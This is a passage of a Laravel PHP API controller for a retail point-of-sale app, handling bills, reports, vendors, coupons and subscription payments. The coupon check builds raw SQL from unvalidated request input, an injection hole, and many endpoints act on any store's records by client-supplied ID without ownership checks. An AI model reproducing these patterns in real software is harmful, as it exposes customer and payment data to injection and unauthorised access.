                $store->last_homepage_video_datetime = $request->video_time;
                $store->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Store status updated successfully'];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getCustomer(Request $request)
    {
        try {
            $rules = [
                'whatsapp_no' => 'required|numeric|digits:10|exists:users,whatsapp_no',
                'store_id' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $customer = User::where('whatsapp_no',$request->whatsapp_no)->where('role_type',4)->first();
                if(!$customer){
                    return Response::json(['success' => false, 'message' => 'Customer not exist in this phone number.'], 404);
                }
                $last_bill = BillDetail::where('store_id',$request->store_id)->where('customer_number',$request->whatsapp_no)->orderBy('id','DESC')->first();
                $response = ['success' => true, 'message' => 'Customer List.', 'customer' => $customer, 'last_bill' => $last_bill];
                DB::commit();
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function report(Request $request)
    {
        try {
            $rules = [
                'store_id' => 'required',
            ];
            if($request->date_range == 'custom'){
                $rules['from_date'] = 'required';
                $rules['to_date'] = 'required';
            }

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                if($request->staff_id)
                {
                    $totalSales = BillDetail::where('staff_id',$request->staff_id)->sum('amount');
                    $totalBilling = BillDetail::where('staff_id',$request->staff_id)->count();
                    $totalCustomer = BillDetail::where('staff_id',$request->staff_id)->distinct()->count('customer_name');
                    $totalLandingAmount = BillDetail::where('staff_id',$request->staff_id)->sum('due_amount');
                    $totalCash = BillDetail::where('staff_id',$request->staff_id)->where('payment_methord','Cash')->sum('total_amount');
                    $totalUpi = BillDetail::where('staff_id',$request->staff_id)->where('payment_methord','Upi')->sum('total_amount');

                    $salesReport = BillDetail::where('staff_id',$request->staff_id)->orderBy('created_at', 'DESC')->get();

                    if($request->date_range == 'daily'){
                        $salesReport = BillDetail::where('staff_id',$request->staff_id)->whereDate('created_at', date('Y-m-d'))->orderBy('created_at', 'DESC')->get();
                    }
                    if($request->date_range == 'weekly'){
                        $sevenDate =  date('Y-m-d',strtotime('-6 days'));
                        $salesReport = BillDetail::where('staff_id',$request->staff_id)->whereDate('created_at', '>=', $sevenDate)->whereDate('created_at', '<=', date('Y-m-d'))->orderBy('created_at', 'DESC')->get();
                    }
                    if($request->date_range == 'monthly'){
                        $salesReport = BillDetail::where('staff_id',$request->staff_id)->whereMonth('created_at', '>=', date('m'))->orderBy('created_at', 'DESC')->get();
                    }
                    if($request->date_range == 'custom'){
                        $salesReport = BillDetail::where('staff_id',$request->staff_id)->whereDate('created_at', '>=', $request->from_date)->whereDate('created_at', '<=', $request->to_date)->orderBy('created_at', 'DESC')->get();

                    }

                }else{

                    $totalSales = BillDetail::where('store_id',$request->store_id)->sum('amount');
                    $totalBilling = BillDetail::where('store_id',$request->store_id)->count();
                    $totalCustomer = BillDetail::where('store_id',$request->store_id)->distinct()->count('customer_name');
                    $totalLandingAmount = BillDetail::where('store_id',$request->store_id)->sum('due_amount');
                    $totalCash = BillDetail::where('store_id',$request->store_id)->where('payment_methord','Cash')->sum('total_amount');
                    $totalUpi = BillDetail::where('store_id',$request->store_id)->where('payment_methord','Upi')->sum('total_amount');
                    // print_r($totalUpi); die;
                    $salesReport = BillDetail::where('store_id',$request->store_id)->orderBy('created_at', 'DESC')->get();
                    $allStock = Product::with('category')->where('store_id',$request->store_id)->get();

                    if($request->date_range == 'daily'){
                        $salesReport = BillDetail::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->orderBy('created_at', 'DESC')->get();
                        $allStock = Product::with('category')->where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->get();
                    }
                    if($request->date_range == 'weekly'){
                        $sevenDate =  date('Y-m-d',strtotime('-6 days'));
                        $salesReport = BillDetail::where('store_id',$request->store_id)->whereDate('created_at', '>=', $sevenDate)->whereDate('created_at', '<=', date('Y-m-d'))->orderBy('created_at', 'DESC')->get();
                        $allStock = Product::with('category')->where('store_id',$request->store_id)->whereDate('created_at', '>=', $sevenDate)->whereDate('created_at', '<=', date('Y-m-d'))->get();
                    }
                    if($request->date_range == 'monthly'){
                    $salesReport = BillDetail::where('store_id',$request->store_id)->whereMonth('created_at', '>=', date('m'))->orderBy('created_at', 'DESC')->get();
                    $allStock = Product::with('category')->where('store_id',$request->store_id)->whereMonth('created_at', '>=', date('m'))->get();
                    }
                    if($request->date_range == 'custom'){
                        $salesReport = BillDetail::where('store_id',$request->store_id)->whereDate('created_at', '>=', $request->from_date)->whereDate('created_at', '<=', $request->to_date)->orderBy('created_at', 'DESC')->get();
                        $allStock = Product::with('category')->where('store_id',$request->store_id)->whereDate('created_at', '>=', $request->from_date)->whereDate('created_at', '<=', $request->to_date)->get();
                    }
                }




                // $lowStock = [];
                // $outogstockStock = [];
                // foreach($allStock as $product){
                //     if($product->stock <= $product->low_stock){
                //        array_push($lowStock,$product);
                //     }
                //     if($product->stock == 0){
                //         array_push($outogstockStock,$product);
                //      }
                // }

                // $itemIds = [];
                // foreach ($salesReport as $history) {
                //     $productDetails = json_decode($history->product_detail, true);
                //     if ($productDetails && is_array($productDetails)) {
                //         foreach ($productDetails as $item) {
                //             if (in_array($item['id'], $itemIds)) {
                //             }else{
                //                 array_push($itemIds,$item['id']);
                //             }
                //         }
                //     }
                // }

                // $mostSold = Product::with('category')->where('store_id',$request->store_id)->whereIn('id',$itemIds)->get();
                // print_r($totalLandingAmount); die;

                $response = ['success' => true, 'message' => 'Report details.', 'totalSales' => $totalSales, 'totalBilling' => $totalBilling, 'totalCustomer' => $totalCustomer, 'totalLandingAmount' => $totalLandingAmount, 'totalCash'=> $totalCash, 'totalUpi'=> $totalUpi, 'salesReport' => $salesReport];
                DB::commit();
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getStore(Request $request)
    {
        try {
            $rules = [
                'store_id' => 'required',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $store = Store::with('user')->where('id',$request->store_id)->first();
                if(!$store)
                {
                    return Response::json(['success' => false, 'message' => 'Store not exist.'], 404);
                }
                $kot  = Kot::where('store_id',$store->id)->first();
                $response = ['success' => true, 'message' => 'Store details.', 'store' => $store, 'kot' => $kot];
                DB::commit();
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getAllCustomers(Request $request)
    {
        try {
            $rules = [
                'store_id' => 'required',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $customers = BillDetail::where('store_id',$request->store_id)->where('customer_name','!=', null)->orderBy('created_at','DESC')->get()->unique('customer_name')->pluck('id');
                $customers = BillDetail::whereIn('id',$customers)->get();
                // $arr = [];
                // foreach($customers as $customer){
                //     array_push($arr , $customer);
                // }
                // print_r($customers->toarray()); die;
                $response = ['success' => true, 'message' => 'Customer Details details.', 'customers' => $customers,];
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getCustomerBill(Request $request)
    {
        try {
            $rules = [
                'store_id' => 'required',
                'whatsapp_no' => 'required',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $biilldetail = BillDetail::where('store_id',$request->store_id)->where('customer_number',$request->whatsapp_no)->orderBy('created_at','DESC')->get();

                $response = ['success' => true, 'message' => 'Customer Bill Details.', 'biilldetail' => $biilldetail,];
                DB::commit();
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function filterCustomerBill(Request $request)
    {
        try {
            $rules = [
                'store_id' => 'required',
            ];
            if($request->date_range == 'custom'){
                $rules['from_date'] = 'required';
                $rules['to_date'] = 'required';
            }

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $customerbillReport =  BillDetail::where('store_id',$request->store_id)->where('customer_name','!=', null)->orderBy('created_at','DESC')->get()->unique('customer_name')->pluck('id');

                if($request->date_range == 'daily'){
                    $customerbillReport = BillDetail::where('store_id',$request->store_id)->where('customer_name','!=', null)->orderBy('created_at','DESC')->whereDate('created_at', date('Y-m-d'))->get()->unique('customer_name')->pluck('id');
                }
                if($request->date_range == 'weekly'){
                    $sevenDate =  date('Y-m-d',strtotime('-6 days'));
                    $customerbillReport = BillDetail::where('store_id',$request->store_id)->where('customer_name','!=', null)->orderBy('created_at','DESC')->whereDate('created_at', '>=', $sevenDate)->whereDate('created_at', '<=', date('Y-m-d'))->get()->unique('customer_name')->pluck('id');
                }
                if($request->date_range == 'monthly'){
                   $customerbillReport = BillDetail::where('store_id',$request->store_id)->where('customer_name','!=', null)->orderBy('created_at','DESC')->whereMonth('created_at', '>=', date('m'))->pluck('id');
                }
                if($request->date_range == 'custom'){
                    $customerbillReport = BillDetail::where('store_id',$request->store_id)->where('customer_name','!=', null)->orderBy('created_at','DESC')->whereDate('created_at', '>=', $request->from_date)->whereDate('created_at', '<=', $request->to_date)->get()->unique('customer_name')->pluck('id');
                }

                $customerbillReport = BillDetail::whereIn('id',$customerbillReport)->get();

                $response = ['success' => true, 'message' => 'Customer bill report.', 'customers' => $customerbillReport];
                DB::commit();
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function deletCustomerBill(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'bill_id' => 'required|exists:bill_details,id|array',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $billdetail = BillDetail::whereIn('id', $request->bill_id)->delete();
                $billtoken = BillToken::whereIn('bill_id', $request->bill_id)->delete();
                DB::commit();
                $response = ['success' => true, 'message' => 'Bill deleted successfully'];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function updatecustomerDueAmount(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'bill_id' => 'required|exists:bill_details,id|numeric',
                'paid_due_amount' => 'required',
                'payment_mode' => 'required',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $billdetail = BillDetail::where('id', $request->bill_id)->first();
                $billdetail->total_amount = $billdetail->total_amount + $request->paid_due_amount;
                $billdetail->payment_methord = $request->payment_mode;
                $billdetail->due_amount = $request->remaining_due_amount;
                $billdetail->due_date = $request->due_date;
                $billdetail->save();

                $activity = AppActivity::create([
                    'action'  => 'Lending limit/due date updated',
                    'message' => Auth::user()->name.' updated Credit limit/default due days',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'BIll Due Amount Updated.', 'bill_data' => $billdetail];
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function homeDashboard(Request $request)
    {
        try {
            $rules = [
                'store_id' => 'required',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $store = Store::with('package')->where('id',$request->store_id)->first();
                if($store->store_status == 3)
                {
                    $date1 = strtotime($store->last_homepage_video_datetime);
                    $date2 = strtotime(date('Y-m-d H:i:s'));

                    $diff = abs($date2 - $date1);
                    $years = floor($diff / (365 * 60 * 60 * 24));
                    $months = floor(($diff - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24));
                    $days = floor(($diff - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 * 24) / (60 * 60 * 24));
                    $hours = floor(($diff - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 * 24 - $days * 60 * 60 * 24) / (60 * 60));
                    $hours = $days*24+$hours;
                    if($hours > 24){
                        $store->store_status = 2;
                        $store->save();
                    }
                }

                $totalSales = BillDetail::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->sum('amount');
                $totalBilling = BillDetail::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->count();
                $totalCash = BillDetail::where('store_id',$request->store_id)->where('payment_methord','Cash')->whereDate('created_at', date('Y-m-d'))->sum('total_amount');
                $totalUpi = BillDetail::where('store_id',$request->store_id)->where('payment_methord','Upi')->whereDate('created_at', date('Y-m-d'))->sum('total_amount');

                $lastbillnumber = BillDetail::where('store_id',$request->store_id)->orderBy('created_at','DESC')->first();
                if($lastbillnumber){
                    $lastbillnumber = $lastbillnumber->bill_number;
                }

                $allStock = Product::where('store_id',$request->store_id)->get();
                $lowStock = [];
                // $outogstockStock = [];
                foreach($allStock as $product){
                    if($product->stock <= $product->low_stock){
                       array_push($lowStock,$product);
                    }
                    // if($product->stock == 0){
                    //     array_push($outogstockStock,$product);
                    //  }
                }
                $storePack = 'trial';
                if($store->package_id != 1)
                {
                    $storePack = 'paid';
                }
                $promotion_banner = DB::table('promotional_banners')->whereRaw("FIND_IN_SET($store->module_id, module_id)")->whereIn('package_type', [$storePack, 'both'])->where('status',1)->first();

                $homepageVideo = null;
                if($store->store_status == 1)
                {
                    // print_R($storePack); die;
                    $homepageVideo = DB::table('homepage_videos')->whereRaw("FIND_IN_SET($store->module_id, module_id)")->whereIn('package_type', [$storePack, 'both'])->where('module_condition',0)->where('status',1)->first();
                }else if($store->store_status == 2){
                    $homepageVideo = DB::table('homepage_videos')->whereRaw("FIND_IN_SET($store->module_id, module_id)")->whereIn('package_type', [$storePack, 'both'])->where('module_condition',1)->where('status',1)->first();
                }
                // print_r($store->store_status); die;

                $response = ['success' => true, 'message' => 'Home Dashboard details.', 'totalSales' => $totalSales, 'totalBilling' => $totalBilling, 'totalCash'=> $totalCash, 'totalUpi'=> $totalUpi , 'lastbillnumber'=> $lastbillnumber, 'lowStock' => count($lowStock),  'store'=> $store, 'promotion_banner' => $promotion_banner, 'homepageVideo' => $homepageVideo];
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }


    //template apis
        public function getTemplateCategory()
        {
            try {
                $templateCat = TemplateCategory::all();
                $response = ['success' => true, 'message' => 'Template Category detail', 'Template_categories' => $templateCat];

                return Response::json($response, 200);
            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function getTemplateType()
        {
            try {
                $templateType = TemplateType::all();
                $response = ['success' => true, 'message' => 'Template Type detail', 'Template_type' => $templateType];

                return Response::json($response, 200);
            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function MarketingTemplate(Request $request)
        {
            try {
                $rules = [
                    // 'template_category_id' => 'required|exists:template_categories,id|numeric',
                    'template_type_id' => 'required|exists:template_types,id|numeric',
                ];
                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $marketTemplate = TemplateMarket::where('template_type_id',$request->template_type_id)->get();
                    if($request->template_category_id){
                        $marketTemplate = TemplateMarket::where('category_id',$request->template_category_id)->where('template_type_id',$request->template_type_id)->get();
                    }
                    $response = ['success' => true, 'message' => 'Market Template Detail.', 'Market_template' => $marketTemplate];

                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function OfferTemplate(Request $request)
        {
            try {
                $rules = [
                    // 'template_category_id' => 'exists:template_categories,id',
                ];
                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $offerTemplate = TemplateOffer::all();
                    if($request->template_category_id){
                        $offerTemplate = TemplateOffer::where('category_id',$request->template_category_id)->get();
                    }
                    $response = ['success' => true, 'message' => 'Offer Template Detail.', 'Offer_template' => $offerTemplate];
                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }
    //

    //vendor-wholeseller
        public function getVendor(Request $request)
        {
            try {
                $rules = [
                    'vendor_number' => 'required|numeric|digits:10|exists:users,whatsapp_no',
                    'store_id' => 'required',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $vendor = User::where('whatsapp_no',$request->vendor_number)->where('role_type',3)->first();
                    if(!$vendor){
                        return Response::json(['success' => false, 'message' => 'Vendor not exist in this phone number.'], 404);
                    }

                    $last_bill = VendorStockPurchase::where('store_id',$request->store_id)->where('vendor_number',$request->vendor_number)->orderBy('id','DESC')->first();
                    $response = ['success' => true, 'message' => 'Vendor List.', 'vendor' => $vendor, 'last_bill' => $last_bill];
                    DB::commit();
                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function addVendorStockPurchase(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'store_id'     => 'required',
                    'bill_number'  => 'required',
                    'vendor_name'  => 'required',
                    'vendor_number'  => 'required',
                    'bill_amount'  => 'required',
                    'paid_amount'  => 'required',
                    'payment_mode' => 'required',
                ];
                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {

                    #save image
                    $vendorbillimage = $request->bill_image;
                    if ($vendorbillimage) {
                        $path  = config('image.profile_image_path_view');
                        $vendorbillimage = CommonController::saveImage($vendorbillimage, $path , 'vendorBillImage');
                    }else{
                        $vendorbillimage = null;
                    }

                    $createstockpurchagse = new VendorStockPurchase();
                    $createstockpurchagse->store_id = $request->store_id;
                    $createstockpurchagse->bill_number = $request->bill_number;
                    $createstockpurchagse->vendor_number = $request->vendor_number;
                    $createstockpurchagse->vendor_name = $request->vendor_name;
                    $createstockpurchagse->bill_amount = $request->bill_amount;
                    $createstockpurchagse->paid_amount = $request->paid_amount;
                    $createstockpurchagse->payment_mode = $request->payment_mode;
                    $createstockpurchagse->credit_amount = $request->credit_amount;
                    $createstockpurchagse->due_date = $request->due_date;
                    $createstockpurchagse->bill_image = $vendorbillimage;
                    $createstockpurchagse->gst_number = $request->gst_number;
                    $createstockpurchagse->gst_amount = $request->gst_amount;
                    $createstockpurchagse->notes = $request->notes;
                    $createstockpurchagse->save();

                    DB::commit();
                    $response = ['success' => true, 'message' => 'Stock Purchase Bill Added Successfully.', 'Stock_purchase' => $createstockpurchagse];

                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function stockPurchaseHistory(Request $request)
        {
            try {
                $rules = [
                    'store_id' => 'required',
                ];
                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $store = Store::where('id',$request->store_id)->first();
                    if(!$store){
                        return Response::json(['success' => false, 'message' => "Store not found."], 200);
                    }
                    $purchasehistory = VendorStockPurchase::where('store_id',$request->store_id)->get();
                    $response = ['success' => true, 'message' => 'Stock Purchase History.', 'Stock_purchase_history' => $purchasehistory];
                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function updatevenderDueAmount(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'stockpurchase_id' => 'required',
                    'paid_due_amount' => 'required',
                    'payment_mode' => 'required',
                ];
                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {

                    $vendorstock = VendorStockPurchase::where('id',$request->stockpurchase_id)->first();
                    if(!$vendorstock){
                        return Response::json(['success' => false, 'message' => "Stock bill not found."], 200);
                    }
                    $vendorstock->paid_amount = $vendorstock->paid_amount + $request->paid_due_amount;
                    $vendorstock->credit_amount = $request->remaining_due_amount;
                    $vendorstock->payment_mode = $request->payment_mode;
                    $vendorstock->due_date = $request->due_date;
                    $vendorstock->save();

                    DB::commit();
                    $response = ['success' => true, 'message' => 'Vendor Due Amount Updated.', 'Stock_purchase_data' => $vendorstock];
                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function deleteVendorStockPurchase(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'stockpurchase_id' => 'required|exists:vendor_stock_purchases,id|numeric',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $stockPurchase = VendorStockPurchase::where('id', $request->stockpurchase_id)->first();
                    $stockPurchase->destroy($stockPurchase->id);
                    DB::commit();
                    $response = ['success' => true, 'message' => 'Stock Purchase deleted successfully'];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function getAllVendors(Request $request)
        {
            try {
                $rules = [
                    'store_id' => 'required',
                ];
                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $vendors = VendorStockPurchase::where('store_id',$request->store_id)->where('vendor_name','!=', null)->orderBy('created_at','DESC')->get()->unique('vendor_name')->pluck('id');
                    $vendors = VendorStockPurchase::whereIn('id',$vendors)->get();

                    $response = ['success' => true, 'message' => 'Vendor Details details.', 'vendors' => $vendors,];
                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }
    //

    //coupan
        public function getCoupan()
        {
            try {
                $coupan = Coupan::all();
                $response = ['success' => true, 'message' => 'Coupan detail', 'Coupan' => $coupan];

                return Response::json($response, 200);
            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function verifyCoupan(Request $request)
        {
            try {
                $rules = [
                    'store_id' => 'required',
                    'coupan_code' => 'required',
                ];
                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $coupan  = Coupan::where('code',$request->coupan_code)->whereRaw('FIND_IN_SET('.$request->store_id.', store_id)')->where('start_date', '<=', date('Y-m-d'))->where('end_date', '>=', date('Y-m-d'))->first();
                    if(!$coupan)
                    {
                        return Response::json(['success' => false, 'message' => 'Coupan not valid']);
                    }

                    $response = ['success' => true, 'message' => 'Coupan details.', 'coupan' => $coupan,];
                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }
    //

    public function forceUpdate(Request $request)
    {
        try {
            $rules = [
                'version' => 'required',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $version = AppVersion::first();
                if(!$version){
                    return Response::json(['success' => false, 'message' => 'Last version not available.'], 200);
                }
                if($request->version < $version->name){
                    return Response::json(['success' => false, 'message' => 'Your app not updated. First update your app.'], 200);
                }

                $response = ['success' => true, 'message' => 'This is your latest version continue.'];

            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function subscriptionOrder(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required',
                'shipping_name' => 'required',
                'shipping_address' => 'required',
                'shipping_city' => 'required',
                'shipping_code' => 'required',
                'shipping_state' => 'required',
                'TotalAmount' => 'required',
                'payment_order_id' => 'required',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $uniqueId = Str::random(8) . time();

                $cashfree_Payment_settlement = CommonController::cashfree_Payment_settlement($request->payment_order_id);
                $cashfree_Payment_settlement = json_decode($cashfree_Payment_settlement);
                foreach($cashfree_Payment_settlement as $cashfree_Payment)
                {
                    if($cashfree_Payment->payment_status == 'SUCCESS'){

                        $package = SubscriptionPackage::where('id',$request->package_id)->first();

                        $products = [
                            'id' => $package->id,
                            'name' => $package->name,
                            'discription' => $package->discription,
                            'price' => $package->subscription_price,
                        ];

                        $orderCount = PackageOrder::count();
                        $newOrderGenerate = new PackageOrder();
                        $newOrderGenerate->store_id = $request->store_id;
                        $newOrderGenerate->product_details = json_encode($products);
                        $newOrderGenerate->shipping_name = $request->shipping_name;
                        $newOrderGenerate->shipping_address = $request->shipping_address;
                        $newOrderGenerate->shipping_city = $request->shipping_city;
                        $newOrderGenerate->shipping_code = $request->shipping_code;
                        $newOrderGenerate->shipping_state = $request->shipping_state;
                        $newOrderGenerate->copanCode = $request->copanCode;
                        $newOrderGenerate->coupanAmount = $request->coupanAmount;
                        $newOrderGenerate->TotalAmount = $request->TotalAmount;
                        $newOrderGenerate->unique_id = $uniqueId;
                        $newOrderGenerate->combined_id = $orderCount + 1 . $uniqueId;
                        $newOrderGenerate->order_number = $orderCount + 1;
                        $newOrderGenerate->save();

                        $newTransection = new PackageTransection();
                        $newTransection->productOrder_id          = $newOrderGenerate->id;
                        $newTransection->store_id                 = $request->store_id;
                        $newTransection->cf_payment_id            = $cashfree_Payment->cf_payment_id;
                        $newTransection->order_amount             = $cashfree_Payment->order_amount;
                        $newTransection->order_id                 = $cashfree_Payment->order_id;
                        $newTransection->payment_amount           = $cashfree_Payment->payment_amount;
                        $newTransection->payment_completion_time  = $cashfree_Payment->payment_completion_time;
                        $newTransection->payment_currency         = $cashfree_Payment->payment_currency;
                        $newTransection->payment_group            = $cashfree_Payment->payment_group;
                        $newTransection->payment_status           = $cashfree_Payment->payment_status;
                        $newTransection->payment_time             = $cashfree_Payment->payment_time;
                        $newTransection->save();

                        $package = SubscriptionPackage::where('id',$request->package_id)->first();
                        $validdate = date('Y-m-d',strtotime(''.$package->validity_days.' days'));
                        // print_r($validdate); die;
                        $store = Store::where('id',$request->store_id)->first();
                        $store->package_id = $package->id;
                        $store->package_active_date = date('Y-m-d');
                        $store->package_valid_date = $validdate;
                        $store->package_amount = $package->subscription_price;
                        $store->package_status = $package->status;
                        $store->save();

                        Store::where('id',$request->store_id)->update(['gst' => $request->billing_gst]);
                        DB::commit();

                        $response = ['success' => true, 'message' => 'Order details.', 'order' => $newOrderGenerate, 'transection' => $newTransection,];
                    }
                }
            }

            return Response::json($response, 200);

        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    //Expense
        public function getExpenseCategory(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'store_id' => 'required|exists:stores,id|numeric',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $expenseCat = ExpenseCategory::where('store_id',$request->store_id)->get();
                    $response = ['success' => true, 'message' => 'Expense category details' , 'ExpenseCategory' => $expenseCat];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function addExpenseCategory(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'store_id' => 'required|exists:stores,id|numeric',
                    'category_name' => 'required',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $checkExpensecat = ExpenseCategory::where('store_id',$request->store_id)->where('name',$request->category_name)->first();
                    if($checkExpensecat)
                    {
                        return Response::json(['success' => false, 'message' => 'Expense category already exist this store.']);
                    }

                    $expenseCat = ExpenseCategory::create([
                        'store_id'     => $request->store_id,
                        'name'         => $request->category_name,
                        'status'       => '1',
                    ]);

                    DB::commit();

                    $response = ['success' => true, 'message' => 'Expense category added successfully' , 'ExpenseCategory' => $expenseCat];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function addExpense(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'store_id'             => 'required|exists:stores,id|numeric',
                    'expense_category_id'  => 'required|exists:expense_categories,id|numeric',
                    'expense_name'         => 'required',
                    'total_amount'         => 'required',
                    'payment_mode'         => 'required',
                ];
                $requestData = $request->all();
